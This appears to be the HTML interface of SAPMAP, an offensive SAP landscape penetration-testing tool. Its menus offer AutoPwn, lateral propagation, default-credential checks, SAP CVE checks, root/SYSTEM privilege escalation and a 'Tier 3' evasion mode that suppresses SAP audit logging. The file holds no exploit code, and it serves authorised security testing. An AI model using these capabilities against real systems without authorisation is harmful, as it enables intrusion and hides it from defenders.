  text-align: center; padding: 4px 10px; font-size: 11px; cursor: pointer;
  background: #161b22d0; color: #8b949e;
  border-radius: 4px; border: 1px solid #30363d;
  pointer-events: auto;
}
.finding-more:hover { color: #c9d1d9; border-color: #484f58; }
/* Bell icon in toolbar with new-finding badge */
#findings-bell {
  position: relative; cursor: pointer; user-select: none;
  padding: 4px 8px; font-size: 15px; color: #c9d1d9;
  border: 1px solid #30363d; border-radius: 4px; background: #161b22;
}
#findings-bell:hover { background: #21262d; }
#findings-bell.has-critical { color: #ff8a80; border-color: #8b0000;
                               box-shadow: 0 0 10px #8b000080; }
#findings-bell.has-high     { color: #ffb27a; border-color: #f0883e; }
#findings-badge {
  position: absolute; top: -6px; right: -6px;
  min-width: 16px; height: 16px; line-height: 16px; padding: 0 4px;
  font-size: 10px; font-weight: 700; text-align: center;
  background: #8b0000; color: #fff; border-radius: 8px;
  display: none;
}
#findings-badge.show { display: inline-block; }
/* Session drawer: full chronological log opened from the bell */
#findings-drawer {
  position: fixed; top: 0; right: 0; width: 420px; height: 100%;
  background: #0d1117; border-left: 1px solid #30363d; z-index: 9999;
  display: none; flex-direction: column;
  box-shadow: -6px 0 24px #0008;
}
#findings-drawer.open { display: flex; }
#findings-drawer-head {
  padding: 10px 14px; border-bottom: 1px solid #30363d;
  display: flex; align-items: center; justify-content: space-between;
  background: #161b22;
}
#findings-drawer-head h3 {
  font-size: 13px; color: #c9d1d9; margin: 0; font-weight: 600;
  letter-spacing: 0.5px;
}
#findings-drawer-body {
  flex: 1; overflow: auto; padding: 8px;
}
#findings-drawer-filters {
  display: flex; align-items: center; gap: 10px;
  padding: 6px 12px; background: #0b0f14;
  border-bottom: 1px solid #30363d;
  font-size: 11px; color: #8b949e;
}
#findings-drawer-filters label {
  display: flex; align-items: center; gap: 4px; cursor: pointer;
}
.findings-tool {
  cursor: pointer; color: #8b949e; padding: 2px 6px;
  font-size: 14px; margin-right: 6px;
}
.findings-tool:hover { color: #c9d1d9; }
.finding-log-row {
  display: block; padding: 6px 10px; margin-bottom: 4px;
  border-left: 3px solid currentColor; border-radius: 2px;
  background: #161b22;
  font-size: 12px; line-height: 1.4;
}
.finding-log-row.sev-CRITICAL { color: #ff8a80; }
.finding-log-row.sev-HIGH     { color: #ffb27a; }
.finding-log-row.sev-MEDIUM   { color: #e6d884; }
.finding-log-row.sev-INFO     { color: #8bd2ff; }
/* Drawer-specific overrides: the banner styles use big outlined
   badges that wrap awkwardly inside the narrow (420px) drawer.  In
   the drawer we want a compact header line and a free-flowing
   message paragraph. */
.finding-log-row .finding-sev {
  font-weight: 700; font-size: 9px; letter-spacing: 0.6px;
  padding: 1px 5px; border-radius: 2px; border: none;
  background: currentColor; color: #0d1117;
  margin-right: 6px; display: inline-block; vertical-align: 1px;
}
.finding-log-row .finding-node {
  font-weight: 700; cursor: pointer;
  text-decoration: underline; text-underline-offset: 2px;
  margin-right: 6px;
}
.finding-log-row .finding-msg {
  display: block; margin-top: 3px;
  color: #c9d1d9; font-weight: 400;
  word-break: break-word;
}
.finding-log-row .finding-fix {
  display: block; margin-top: 2px; margin-left: 4px;
  font-size: 10px; color: #3fb950; opacity: 0.85;
  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  max-width: 100%;
}
.finding-log-row .finding-cve {
  display: inline-block; margin-left: 4px;
  font-size: 10px; padding: 0 4px; border-radius: 2px;
  border: 1px solid currentColor; opacity: 0.75;
  vertical-align: 1px;
}
.shell-window {
  position: fixed; width: 820px; height: 520px;
  min-width: 400px; min-height: 300px; padding: 0;
  display: flex; flex-direction: column; overflow: hidden;
  top: 50%; left: 50%; transform: translate(-50%, -50%);
}
.shell-titlebar {
  cursor: move; padding: 8px 12px; background: #161b22;
  border-bottom: 1px solid #30363d; flex-shrink: 0;
  user-select: none; -webkit-user-select: none;
}
.shell-titlebar h3 { font-size: 14px; color: #f0883e; }
.shell-resize-handle {
  position: absolute; bottom: 0; right: 0; width: 16px; height: 16px;
  cursor: nwse-resize; z-index: 10;
  background: linear-gradient(135deg, transparent 50%, #484f58 50%, transparent 60%,
    #484f58 70%, transparent 80%, #484f58 90%);
}
</style>
</head>
<body>

<!-- Menu Bar -->
<div class="menu-bar">
  <span class="logo">&#9889; SAPMAP</span>
  <!-- READ-ONLY badge: shown only when body.read-only is set (see /api/mode
       poll in initMode() below).  Green pill sits next to the logo so it's
       impossible to miss, and its :not() sibling selector keeps the layout
       identical when the mode is off. -->
  <span id="mode-badge" class="mode-badge ro-badge" title="Read-only mode: exploits, cleanup, credential dumps and other destructive actions are disabled.  Restart SAPMAP without --read-only to enable them."
        style="display:none;background:#3fb950;color:#0d1117;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600;margin-left:8px;letter-spacing:0.3px;vertical-align:middle">READ-ONLY</span>
  <div class="menu-item">File
    <div class="menu-dropdown">
      <div class="dd-item" onclick="loadState()">&#128194; Load State...</div>
      <div class="dd-item" onclick="saveState()">&#128190; Save State...</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="exportJSON()">&#128196; Export JSON</div>
      <div class="dd-item" onclick="exportReport()">&#128221; Export Engagement Report (HTML + Markdown)</div>
      <div class="dd-item" onclick="openDiffModal()">&#128202; Diff Two Runs (compare snapshots)</div>
      <!-- Browse Loot: hidden by default; unhidden by initMode() only when
           the server was started with --enable-loot-browser AND handed
           the frontend a per-run token via /api/mode. -->
      <div id="dd-browse-loot" class="dd-item" style="display:none"
           onclick="openLootBrowser()">&#128194; Browse Loot (remote download)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="if(confirm('Exit SAPMAP?'))api('POST','exit').then(()=>window.close())">&#10060; Exit</div>
    </div>
  </div>
  <div class="menu-item">Scan
    <div class="menu-dropdown">
      <div class="dd-item" onclick="toggleToolbar()">&#128295; Toggle Scan Panel</div>
    </div>
  </div>
  <div class="menu-item">Actions
    <div class="menu-dropdown">
      <div class="dd-header">Landscape-wide</div>
      <div class="dd-item" onclick="scanAllVulns()" style="color:#f0883e">&#128270; Scan for All Vulnerabilities</div>
      <div class="dd-item write-op" onclick="showAutoPwnModal()" style="color:#f85149;font-weight:bold">&#9889; AutoPwn</div>
      <div class="dd-item write-op" onclick="propagateAll()">&#128640; Auto-Propagate All</div>
      <div class="dd-item" onclick="testAllRFCs()">&#129514; Test All RFC Destinations</div>
      <div class="dd-item write-op" onclick="cleanupAll()">&#129529; Cleanup All Users</div>
      <div class="dd-sep"></div>
      <!-- Bulk vuln checks — mirror of the map's right-click context menu so
           every "Check All …" entry is reachable without right-clicking the
           empty canvas (operators on a touchpad / Windows lacking a real
           right-click button asked for this).  The right-click menu hides
           items conditionally based on landscape contents; this list does
           NOT — the per-action JS handlers already alert when there's
           nothing eligible (e.g. checkAllGateways() with no GW ports). -->
      <div class="dd-header">Bulk vuln checks</div>
      <div class="dd-item" onclick="checkAllGateways()">&#128272; Check All GW Vulnerabilities</div>
      <div class="dd-item" onclick="checkAllBetrusted()">&#128272; Check All 10KBlaze (MS Betrusted)</div>
      <div class="dd-item" onclick="checkAllCve31324()">&#128272; Check All CVE-2025-31324 (Java VisualComposer)</div>
      <div class="dd-item" onclick="checkAllCve6287()">&#128272; Check All CVE-2020-6287 (RECON)</div>
      <div class="dd-item" onclick="checkAllCve22536()">&#128272; Check All CVE-2022-22536 (ICMAD)</div>
      <div class="dd-item" onclick="checkAllRouterInfo()">&#128272; Check All SAProuter Info Leak</div>
      <div class="dd-item" onclick="checkAllSnc()">&#128274; Check All SNC Posture</div>
      <div class="dd-sep"></div>
      <div class="dd-header">Analysis</div>
      <div class="dd-item" onclick="showAttackCoverage()">&#9876;&#65039; ATT&amp;CK Coverage Matrix</div>
      <div class="dd-item" onclick="analyzeChains()">&#128279; Analyze Trust Chains</div>
      <div class="dd-sep"></div>
      <div class="dd-header">Engagement housekeeping</div>
      <div class="dd-item" onclick="showCreatedUsers()">&#128203; View Created Users</div>
      <div class="dd-item" onclick="showCreatedDestinations()">&#128203; View Created TCP/IP Destinations</div>
      <div class="dd-item" onclick="clearCreatedDestinations()">&#128465; Clear TCP/IP Destinations List</div>
      <div class="dd-sep"></div>
      <div class="dd-header">Add / configure</div>
      <div class="dd-item" onclick="showAddSystemModal()">&#10133; Add System Manually</div>
      <div class="dd-item" onclick="showSetPasswordModal()">&#128273; Set Default Password</div>
      <div class="dd-item" onclick="showHashesApiKeyModal()">&#128273; Set hashes.com API Key</div>
      <div class="dd-item" onclick="showSdkPathModal()">&#128194; Set NW RFC SDK Path</div>
      <div class="dd-item" onclick="showSapologyPathModal()">&#128194; Set SAPology Path (Deep Scan)</div>
      <div class="dd-item" onclick="showBtpTokenModal()">&#9729;&#65039; BTP — Paste cf oauth-token</div>
      <div class="dd-item" onclick="showBtpProxyModal()">&#9729;&#65039; BTP — Connectivity Proxy Override</div>
    </div>
  </div>
  <div class="menu-item">View
    <div class="menu-dropdown">
      <div class="dd-item" onclick="zoomIn()">&#128269; Zoom In</div>
      <div class="dd-item" onclick="zoomOut()">&#128269; Zoom Out</div>
      <div class="dd-item" onclick="fitMap()">&#128208; Fit to Window</div>
      <div class="dd-item" onclick="resetLayout()">&#128260; Reset Layout (Grid)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="layoutCircle()">&#9711; Layout: Circle</div>
      <div class="dd-item" onclick="layoutStar()">&#10024; Layout: Star (hub &amp; spoke)</div>
      <div class="dd-item" onclick="layoutHierarchy()">&#128719; Layout: Hierarchy (top &rarr; bottom by RFC)</div>
      <div class="dd-item" onclick="layoutByStack()">&#128218; Layout: Group by Stack (ABAP / Java / Dual)</div>
      <div class="dd-sep"></div>
      <div class="dd-item" onclick="toggleConsole()">&#128203; Toggle Console</div>
    </div>
  </div>
  <div class="menu-item">Help
    <div class="menu-dropdown">
      <div class="dd-item" onclick="showAbout()">&#8505;&#65039; About &amp; Disclaimer</div>
    </div>
  </div>
</div>

<!-- Toolbar (Scan Configuration) -->
<div class="toolbar" id="toolbar" style="flex-wrap:wrap;gap:4px 8px">
  <label>Targets:</label>
  <input type="text" id="targets" placeholder="192.168.1.0/24 or @targets.txt" value="" onkeydown="if(event.key==='Enter')startScan()">
  <label>Inst:</label>
  <input type="number" id="inst-from" value="0" min="0" max="99">
  <span style="color:#484f58">-</span>
  <input type="number" id="inst-to" value="99" min="0" max="99">
  <label>Threads:</label>
  <input type="number" id="threads" value="30" min="1" max="200" title="Threads per host for port scanning">
  <label>Timeout:</label>
  <input type="number" id="timeout" value="3" min="1" max="30" step="0.5" style="width:45px" title="Socket timeout (seconds)">
  <div class="radio-group">
    <label><input type="radio" name="scanmode" value="fast" checked> Fast</label>
    <label><input type="radio" name="scanmode" value="deep"> Deep</label>
  </div>
  <button class="btn" onclick="toggleAdvanced()" style="font-size:10px;padding:2px 8px" title="Show advanced scan settings">&#9881; Adv</button>
  <button class="btn btn-primary" onclick="startScan()">&#9654; Scan</button>
  <button class="btn btn-danger" onclick="stopScan()">&#9724; Stop</button>
  <span style="flex:1"></span>
  <button class="btn" onclick="loadState()">&#128194; Load</button>
  <button class="btn" onclick="saveState()">&#128190; Save</button>
</div>
<!-- Advanced scan settings (hidden by default) -->
<div class="toolbar" id="toolbar-adv" style="display:none;padding:4px 12px;gap:4px 12px;flex-wrap:wrap;background:#12161d;border-bottom:1px solid #30363d">
  <span style="color:#8b949e;font-size:11px;font-weight:600">Advanced:</span>
  <label>Concurrent Hosts:</label>
  <input type="number" id="adv-concurrent" value="5" min="1" max="20" style="width:45px" title="Max hosts to port-scan in parallel (higher=faster but may miss ports)">
  <label>Port Timeout:</label>
  <input type="number" id="adv-port-timeout" value="2.0" min="0.5" max="10" step="0.5" style="width:50px" title="TCP connect timeout for port probes (seconds). Lower=faster but may miss slow ports">
  <label>Alive Timeout:</label>
  <input type="number" id="adv-alive-timeout" value="0.5" min="0.2" max="5" step="0.1" style="width:50px" title="Timeout for host alive detection (seconds)">
  <label style="cursor:pointer"><input type="checkbox" id="adv-skip-alive" style="margin-right:3px">Skip Alive Sweep</label>
  <label style="cursor:pointer" title="Send ONE login POST per Cloud Connector found (Administrator/manage). Off by default — leaves a failed-login audit entry on the SCC."><input type="checkbox" id="adv-scc-probe-creds" style="margin-right:3px">SCC: Probe Default Creds</label>
</div>

<!-- Activity Bar -->
<div id="activity-bar"><span class="activity-dot"></span><span id="activity-prefix">Working</span><span id="activity-text">...</span></div>
<div class="ctx-tooltip" id="ctx-tooltip"></div>
<div id="evasion-armed-bar" style="display:none;align-items:center;gap:8px;background:linear-gradient(90deg,#3a0808 0%,#1a0e0e 100%);border-bottom:2px solid #f85149;padding:6px 16px;font-size:13px;font-weight:600;color:#ff9b9b;text-shadow:0 0 6px #f8514980" title="Tier 3 active-evasion techniques are armed for this session.  SAL filter narrow, kernel-param dynamic-set, STAD/DBTABLOG suppression, NWA log-config flip etc. will RUN when invoked.  Toggle off in Settings to re-arm gate.">
  <span style="font-weight:700;color:#f85149;text-transform:uppercase;font-size:11px;letter-spacing:1px;padding:2px 8px;border:1px solid #f8514980;border-radius:3px;background:#f8514915">⚡ Tier 3 Armed</span>
  <span id="evasion-armed-text">Active-evasion techniques unlocked for this session.  Every Tier 3 entry point snapshots a baseline and restores on exit.</span>
</div>

<!-- Critical-finding banner (rendered by renderFindings()) -->
<div id="findings-bar"></div>

<!-- Session drawer for the full findings log (opens from the bell) -->
<div id="findings-drawer">
  <div id="findings-drawer-head">
    <h3>&#128276; Session Findings</h3>
    <span style="flex:1"></span>
    <span class="findings-tool" onclick="copyFindingsMarkdown()"
          title="Copy all findings as markdown">&#128203;</span>
    <span style="cursor:pointer;color:#8b949e;font-size:16px"
          onclick="toggleFindingsDrawer()" title="Close">&times;</span>
  </div>
  <div id="findings-drawer-filters">
    <label><input type="checkbox" id="fflt-crit" checked
             onchange="renderFindings()"> CRITICAL</label>
    <label><input type="checkbox" id="fflt-high" checked
             onchange="renderFindings()"> HIGH</label>
    <label><input type="checkbox" id="fflt-med"  checked
             onchange="renderFindings()"> MEDIUM</label>
    <label><input type="checkbox" id="fflt-info" checked
             onchange="renderFindings()"> INFO</label>
    <span style="flex:1"></span>
    <input type="text" id="fflt-node" placeholder="Filter by SID/host"
           oninput="renderFindings()"
           style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;
                  padding:2px 6px;font-size:11px;border-radius:3px;width:100px">
  </div>
  <div id="findings-drawer-body"><div style="color:#6e7681;padding:20px;text-align:center">No findings yet</div></div>
</div>

<!-- Main Area -->
<div class="main">
  <!-- Map -->
  <div class="map-container" id="map-container">
    <div class="empty-msg" id="empty-msg">Start a scan or load a saved state to discover SAP systems</div>
    <!-- Issue #2 (item 5) — one-time onboarding card shown on empty
         landscape.  localStorage key sapmap.welcome.dismissed keeps
         it away after the operator closes it once. -->
    <div id="welcome-card" role="dialog" aria-label="Getting started">
      <span class="welcome-dismiss" onclick="dismissWelcomeCard()" title="Don't show again">&times;</span>
      <h4>&#128075; Welcome to SAPMAP</h4>
      <div>Four ways to get systems onto the map:</div>
      <ol>
        <li><strong>Scan a network</strong> — open the Scan panel (top-nav <em>Scan</em> or Ctrl+K) and enter targets.</li>
        <li><strong>Add manually</strong> — <em>Actions &rarr; Add System Manually</em> if you already know the host / instance.</li>
        <li><strong>Load a saved state</strong> — <em>File &rarr; Load</em> to open a `.sapmap` snapshot from a previous engagement.</li>
        <li><strong>Right-click the canvas</strong> for the full bulk-action menu (Check All GW, All 10KBlaze, All CVE-…, chain analysis, etc.).</li>
      </ol>
      <div style="color:#6e7681;font-size:11px;margin-top:6px">The top-nav <em>Actions</em> menu also holds every scan-wide operation — vuln checks, AutoPwn, propagation, cleanup — worth a look on first run.</div>
    </div>
    <svg id="map-svg" xmlns="http://www.w3.org/2000/svg"></svg>
    <!-- Pulse overlay: short-lived SVG rects/lines flashed when a finding
         fires.  Lives outside #map-svg so innerHTML rebuilds don't wipe
         in-flight animations.  viewBox is kept in sync by applyViewBox(). -->
    <svg id="pulse-svg" xmlns="http://www.w3.org/2000/svg"
         style="position:absolute;inset:0;width:100%;height:100%;
                pointer-events:none;z-index:5"></svg>
  </div>

  <!-- Legend — collapsed bar (click LEGEND to expand modal) -->
  <div class="legend-bar" id="legend-bar" style="display:none">
    <button class="legend-btn" onclick="openLegend()" title="Show map legend">
      &#128712;&#65039; Legend <span class="caret">&#9660;</span>
    </button>
    <span class="legend-sep"></span>
    <!-- Show a few of the highest-value swatches inline so the bar
         still gives at-a-glance recall.  Full detail lives in the modal. -->
    <span class="legend-item" title="Deep-red thick line = OS shell on target (SAPControl OSExecute / CTCWebService)">
      <svg width="22" height="10" style="vertical-align:middle"><line x1="0" y1="5" x2="22" y2="5" stroke="#c0392b" stroke-width="5"/></svg>
      OS shell
    </span>
    <span class="legend-item" title="Bright-red line = RFC logon OK + SAP_ALL role">
      <svg width="22" height="10" style="vertical-align:middle"><line x1="0" y1="5" x2="22" y2="5" stroke="#e74c3c" stroke-width="4"/></svg>
      SAP_ALL
    </span>
    <span class="legend-item" title="Green line = RFC logon OK (creds work)">
      <svg width="22" height="10" style="vertical-align:middle"><line x1="0" y1="5" x2="22" y2="5" stroke="#2ecc71" stroke-width="4"/></svg>
      Logon OK
    </span>
    <span class="legend-item" title="Purple dotted = Type-G / Type-H HTTP destination">
      <svg width="22" height="10" style="vertical-align:middle"><line x1="0" y1="5" x2="22" y2="5" stroke="#a371f7" stroke-width="3" stroke-dasharray="2,2"/></svg>
      HTTP
    </span>
    <span class="legend-item" title="Light-blue line = RFC destination (not tested yet)">
      <svg width="22" height="10" style="vertical-align:middle"><line x1="0" y1="5" x2="22" y2="5" stroke="#5dade2" stroke-width="3"/></svg>
      Untested
    </span>
    <span style="flex:1"></span>
    <label style="cursor:pointer;display:flex;align-items:center;gap:6px;padding:2px 10px;border:1px solid #30363d;border-radius:4px;background:#161b22;color:#c9d1d9;font-size:11px"><input type="checkbox" id="show-unknown" style="accent-color:#f0883e;width:14px;height:14px" onchange="updateMap()"> Show unknown targets</label>
  </div>

  <!-- Legend — full modal.  Groups every edge/node style into sections
       so operators can look up unfamiliar renderings without hunting
       through source code. -->
  <div class="modal-overlay" id="legend-modal"
       onclick="if(event.target===this)closeModal('legend-modal')">
    <div class="modal legend-modal">
      <h3>
        <span>&#128712;&#65039; Map Legend</span>
        <button class="close-x" onclick="closeModal('legend-modal')" title="Close">&times;</button>
      </h3>

      <div class="legend-section">
        <h4>Nodes</h4>
        <div class="legend-grid">
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:#4a1a1a;border:1px solid #8b0000;width:22px;height:14px"></span></span><span class="label"><b>PRD system</b> — red-tinted box, treat any finding as blocking</span></div>
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:#4a3a1a;border:1px solid #e67e22;width:22px;height:14px"></span></span><span class="label"><b>Non-PRD system</b> — dev / QA / test tier</span></div>
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:transparent;border:2px solid #8b0000;width:22px;height:14px"></span></span><span class="label"><b>Critical finding</b> — thick red border on any node</span></div>
          <div class="legend-row"><span class="swatch-cell" style="font-size:16px">&#9889;</span><span class="label"><b>Pwned</b> — SAPMAP has created a user or captured shell</span></div>
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:#046c7a;width:22px;height:14px;clip-path:polygon(15% 0,85% 0,100% 50%,85% 100%,15% 100%,0 50%)"></span></span><span class="label"><b>SAP Cloud Connector</b> — hexagonal teal node</span></div>
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:#4d9eb6;width:22px;height:14px"></span></span><span class="label"><b>Web Dispatcher</b> — cyan node with backend fan-out</span></div>
          <div class="legend-row"><span class="swatch-cell"><span style="color:#a371f7;font-size:16px">&#9729;</span></span><span class="label"><b>BTP subaccount</b> — cloud shape, one per subaccount</span></div>
          <div class="legend-row"><span class="swatch-cell"><span class="legend-swatch" style="background:#1a1a2e;border:3px dashed #484f58;width:22px;height:14px"></span></span><span class="label"><b>Unknown target</b> — placeholder (opt-in via checkbox)</span></div>
        </div>
      </div>

      <div class="legend-section">
        <h4>RFC destinations (Type-3)</h4>
        <div class="legend-grid">
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#c0392b" stroke-width="9"/></svg></span><span class="label"><b>OS shell verified</b> — SAPControl OSExecute or CTCWebService/FileSystemConfig grants shell as &lt;sid&gt;adm (kernel-level, beats SAP_ALL)</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#e74c3c" stroke-width="8"/></svg></span><span class="label"><b>RFC Logon OK + SAP_ALL</b> — captured a stored credential with SAP_ALL role</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#ff6b35" stroke-width="7" stroke-dasharray="8,4"/></svg></span><span class="label"><b>TCP/IP (sapxpg) works</b> — 10KBLAZE / GW SAPXPG remote command execution</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#f0883e" stroke-width="7" stroke-dasharray="12,4"/></svg></span><span class="label"><b>Trusted RFC</b> — SM59 Trust = Yes (RFCOPTIONS Q=Y).  Inbound trust: caller can land authenticated calls without a password</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#2ecc71" stroke-width="7"/></svg></span><span class="label"><b>RFC Logon OK</b> — creds work, role not yet SAP_ALL confirmed</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#5dade2" stroke-width="6"/></svg></span><span class="label"><b>RFC (untested)</b> — destination present, credential/reach not verified</span></div>
        </div>
      </div>

      <div class="legend-section">
        <h4>HTTP destinations (Type-G / Type-H)</h4>
        <div class="legend-grid">
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#a371f7" stroke-width="6" stroke-dasharray="2,2"/></svg></span><span class="label"><b>HTTP destination</b> — Type-G (external HTTP) or Type-H (HTTP to ABAP).  Purple dotted; upgrades to OS-shell red once SAPControl OSExecute or CTCWebService confirms shell control</span></div>
        </div>
      </div>

      <div class="legend-section">
        <h4>SAP Cloud Connector tunnels</h4>
        <div class="legend-grid">
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#3fb950" stroke-width="5" stroke-dasharray="6,4"/></svg></span><span class="label"><b>Reach OK</b> — every mapping smoke-tested successfully</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#f85149" stroke-width="5" stroke-dasharray="6,4"/></svg></span><span class="label"><b>Unreachable</b> — at least one mapping failed its probe</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#f0883e" stroke-width="5" stroke-dasharray="6,4"/></svg></span><span class="label"><b>PP enabled</b> — Principal Propagation configured (KERBEROS / X509_*)</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#f85149" stroke-width="6"/></svg></span><span class="label"><b>PP CONFIRMED</b> — SAPMAP live-verified impersonation through this SCC</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#a371f7" stroke-width="4" stroke-dasharray="2,3"/></svg></span><span class="label"><b>HA shadow</b> — master ↔ shadow pair between two SCCs</span></div>
        </div>
      </div>

      <div class="legend-section">
        <h4>Other edges &amp; markers</h4>
        <div class="legend-grid">
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#4d9eb6" stroke-width="4"/></svg></span><span class="label"><b>Web Dispatcher &rarr; backend</b> — cyan; dashed when the backend's Server header was suppressed</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#5dade2" stroke-width="4.5" stroke-dasharray="4,4"/></svg></span><span class="label"><b>SCC tunnel indicator</b> — matched location_id mapping between an SCC node and a plotted backend</span></div>
          <div class="legend-row"><span class="swatch-cell"><svg width="34" height="10"><line x1="0" y1="5" x2="34" y2="5" stroke="#e74c3c" stroke-width="4"/></svg></span><span class="label"><b>Attack-chain highlight</b> — animated red glow when a chain is selected in the Attack Paths panel</span></div>
          <div class="legend-row"><span class="swatch-cell"><span style="color:#a371f7;font-size:16px">&#9729;</span></span><span class="label"><b>OAuth 2.0 client_secret</b> — small purple cloud on a node = /OA2C/CS_ row present in SecStore (BTP-lateral material)</span></div>
        </div>
      </div>

      <div class="form-actions">
        <button class="btn" onclick="closeModal('legend-modal')">Close</button>
      </div>
    </div>
  </div>

  <!-- Console restore button (visible when console is minimized) -->
  <div id="console-restore" style="display:none;height:24px;flex-shrink:0;background:#161b22;border-top:1px solid #30363d;cursor:pointer;text-align:right;padding-right:12px;line-height:24px;color:#8b949e;font-size:12px;user-select:none" onclick="toggleConsole()" title="Show Console">&#9650; Console</div>

  <!-- Drag handle to resize console -->
  <div class="console-resizer" id="console-resizer" title="Drag to resize console"></div>

  <!-- Console -->
  <div class="console-container" id="console-container">
    <div class="console-header">
      <span>Console</span>
      <span style="flex:1"></span>
      <span id="console-status" style="margin-right:12px">Ready</span>
      <span style="cursor:pointer;font-size:13px;color:#8b949e;padding:0 4px" onclick="toggleConsole()" title="Minimize console">&#9660;</span>
      <span style="cursor:pointer;font-size:13px;color:#8b949e;padding:0 4px" onclick="maximizeConsole()" title="Maximize / Restore console">&#9633;</span>
    </div>
    <div class="console-body" id="console-body">
      <div class="cl-info">[Ready] Waiting for scan...</div>
    </div>
  </div>
</div>

<!-- Status Bar -->
<div class="status-bar">
  <span class="stat">Status: <span class="stat-val" id="st-status">Idle</span></span>
  <span class="stat">Systems: <span class="stat-val" id="st-systems">0</span></span>
  <span class="stat">Connections: <span class="stat-val" id="st-connections">0</span></span>
  <span class="stat">Pwned: <span class="stat-val" id="st-pwned">0</span></span>
  <span class="stat">Users Created: <span class="stat-val" id="st-users">0</span></span>
  <span style="flex:1"></span>
  <span id="findings-bell" onclick="toggleFindingsDrawer()"
        title="Session findings (click to open)">&#128276;<span id="findings-badge">0</span></span>
</div>

<!-- Context Menu (items enabled/disabled dynamically by showCtxMenu) -->
<div class="ctx-menu" id="ctx-menu">
  <!-- Top-level quick actions -->
  <div class="ctx-item" data-action="details">&#128269; View System Details</div>
  <div class="ctx-item" data-action="findings">&#128203; View Findings</div>
  <div class="ctx-item write-op" data-action="wd_admin_creds">&#128273; Add WD admin credentials (webadm / pull backend table)</div>
  <div class="ctx-item" data-action="credentials">&#128273; Provide Credentials</div>
  <div class="ctx-item" data-action="remove_credentials">&#128465;&#65039; Remove Credentials</div>
  <div class="ctx-sep"></div>
  <!-- Scanning submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128225; Scanning</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="standard_scan">&#128270; Standard Scan (fingerprint host)</div>
      <div class="ctx-item write-op" data-action="analyse_capabilities">&#128201; Analyse User Capabilities</div>
      <div class="ctx-item" data-action="rfc_system_info">&#128225; RFC System Info</div>
      <div class="ctx-item" data-action="check_gw">&#128270; Check GW Vulnerability</div>
      <div class="ctx-item" data-action="check_ms">&#128270; Check MS Betrusted (CVE-2020-6207)</div>
      <div class="ctx-item" data-action="check_cve_31324">&#128270; Check CVE-2025-31324 (Java VisualComposer)</div>
      <div class="ctx-item" data-action="check_cve_6287">&#128270; Check CVE-2020-6287 (RECON)</div>
      <div class="ctx-item" data-action="check_cve_22536">&#128270; Check CVE-2022-22536 (ICMAD smuggle)</div>
      <div class="ctx-item" data-action="wd_rediscover">&#128260; Rediscover WD topology (cache + backends)</div>
      <div class="ctx-item" data-action="check_linux_lpe">&#128275; Check Linux Root LPE (Copy Fail / pedit-COW / Dirty Frag)</div>
      <div class="ctx-item" data-action="check_windows_lpe">&#128274; Check Windows SYSTEM LPE (auto: EfsPotato / GodPotato / MiniPlasma)</div>
      <div class="ctx-item" data-action="deep_scan">&#128260; Deep Scan (full SAPology)</div>
      <div class="ctx-item" data-action="retrieve_rfcs">&#128225; Retrieve RFC Connections</div>
      <div class="ctx-item" data-action="read_java_destinations">&#128225; Read Java JCo Destinations</div>
      <div class="ctx-item" data-action="tms_discover">&#128225; Discover TMS topology (TMSMCONF/TMSCSYS)</div>
      <div class="ctx-item" data-action="test_rfcs">&#129514; Test RFC Connections</div>
      <div class="ctx-item" data-action="enum_clients">&#128202; Enumerate Clients</div>
      <div class="ctx-item write-op" data-action="client_roles">&#128202; Retrieve Client Roles</div>
      <div class="ctx-item write-op" data-action="default_creds">&#9888; Check Default Accounts</div>
      <div class="ctx-item" data-action="check_router_info">&#128268; Check SAProuter Info Leak</div>
      <div class="ctx-item" data-action="router_scan">&#128270; Scan Internally via SAProuter</div>
    </div>
  </div>
  <!-- Exploitation submenu -->
  <div class="ctx-group write-op">
    <div class="ctx-item">&#9876; Exploitation</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="lpe">&#128274; ABAP Local Privilege Escalation</div>
      <div class="ctx-item" data-action="exploit_linux_lpe">&#9889; Escalate to Root (pick: Copy Fail / pedit-COW / Dirty Frag)</div>
      <div class="ctx-item" data-action="exploit_windows_lpe">&#9889; Escalate to SYSTEM (auto: EfsPotato / GodPotato / MiniPlasma)</div>
